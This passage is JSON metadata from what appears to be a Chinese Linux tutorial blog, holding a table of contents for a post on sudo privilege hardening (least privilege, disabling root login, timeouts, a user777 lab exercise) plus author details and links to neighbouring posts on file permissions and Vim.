href=\"#1-%E6%9C%80%E5%B0%8F%E6%9D%83%E9%99%90%E5%8E%9F%E5%88%99%EF%BC%9A\"><span class=\"toc-text\">1.最小权限原则：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E7%A6%81%E7%94%A8%E5%AF%86%E7%A0%81%EF%BC%88%E8%B0%A8%E6%85%8E%E4%BD%BF%E7%94%A8%EF%BC%89%EF%BC%9A\"><span class=\"toc-text\">2.禁用密码（谨慎使用）：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E6%97%A5%E5%BF%97%E7%9B%91%E6%8E%A7%EF%BC%9A\"><span class=\"toc-text\">3.日志监控：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#4-%E8%B6%85%E6%97%B6%E9%85%8D%E7%BD%AE%EF%BC%9A\"><span class=\"toc-text\">4.超时配置：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#5-%E7%A6%81%E7%94%A8-root-%E7%99%BB%E5%BD%95%EF%BC%9A\"><span class=\"toc-text\">5.禁用 root 登录：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#6%E3%80%81%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95\"><span class=\"toc-text\">6、高级用法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%99%90%E5%88%B6%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0\"><span class=\"toc-text\">限制命令参数</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#7%E3%80%81%E5%AE%9E%E9%AA%8C%E7%BB%83%E4%B9%A0\"><span class=\"toc-text\">7、实验练习</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E4%B8%80%E4%B8%AA%E6%96%B0%E7%94%A8%E6%88%B7user777%E5%85%B7%E6%9C%89%E5%88%A0%E9%99%A4test%E7%94%A8%E6%88%B7%E7%9A%84%E6%9D%83%E9%99%90\"><span class=\"toc-text\">使一个新用户user777具有删除test用户的权限</span></a></li></ol></li></ol></li></ol></li></ol>","author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"用户权限","uid":"bcdac3d434efc7f27225ef4360e8f77f","slug":"用户权限","date":"2025-08-01T02:10:46.000Z","updated":"2025-08-02T08:29:07.796Z","comments":true,"path":"api/articles/用户权限.json","keywords":null,"cover":[],"text":"用户权限一、基本权限UGO1.UGO的含义​ U (User)：文件或目录的所有者（创建者或通过 chown 指定的用户）-属主 ​ G (Group)：文件或...","permalink":"/post/用户权限","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[],"tags":[{"name":"Linux","slug":"Linux","count":12,"path":"api/tags/Linux.json"}],"author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"VIM-编辑器与用户管理","uid":"a2f5984a703b9b38689c64c1a82d51c5","slug":"VIM-编辑器与用户管理","date":"2025-07-30T11:03:12.000Z","updated":"2025-07-31T14:01:09.077Z","comments":true,"path":"api/articles/VIM-编辑器与用户管理.json","keywords":null,"cover":[],"text":"VIM-编辑器与用户管理VIM编辑器1、Vim简介与模式Vim是一个高效文本编辑器，核心在于模式切换： 普通模式（Normal Mode）：移动光标、执行命令（...","permalink":"/post/VIM-编辑器与用户管理","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 mins."},"categories":[],"tags":[{"name":"Linux","slug":"Linux","count":12,"path":"api/tags/Linux.json"}],"author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}